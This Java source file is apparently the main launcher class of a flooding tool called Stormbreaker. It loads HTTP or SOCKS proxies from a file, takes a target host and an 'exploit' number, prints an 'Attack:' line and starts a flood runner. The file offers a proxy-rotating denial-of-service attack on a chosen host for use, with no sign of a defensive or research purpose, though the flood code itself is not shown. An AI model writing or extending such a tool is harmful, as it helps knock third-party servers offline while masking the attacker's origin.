package com.gabrielhd.Stormbreaker;

import com.gabrielhd.Stormbreaker.flood.FloodRunner;
import com.gabrielhd.Stormbreaker.proxy.Proxies;
import com.gabrielhd.Stormbreaker.option.Options;

import java.net.Proxy;

public class Stormbreaker
{
    private Options options;
    
    public Stormbreaker(Options options) {
        this.options = options;
    }
    
    public void launch() {
        if (!this.options.isOption("host")) {
            System.out.println("No \"host\" option provided!");
            return;
        }
        String proxiesType = this.options.getOption("proxiesType", "http");
        String proxiesFile = this.options.getOption("proxiesFile", "proxies.txt");
        Proxies proxies = new Proxies();
        try {
            if (proxiesType.equalsIgnoreCase("socks")) {
                proxies.init(proxiesFile, Proxy.Type.SOCKS);
            }
            else {
                proxies.init(proxiesFile, Proxy.Type.HTTP);
            }
        }
        catch (Exception ex) {
            System.out.println("Couldn't init proxies instance!");
            return;
        }
        System.out.println();
        System.out.println("Proxies: " + proxies.size());
        System.out.println("Attack: " + this.options.getOption("exploit", "1"));
        new FloodRunner(this.options, proxies).run();
    }
}
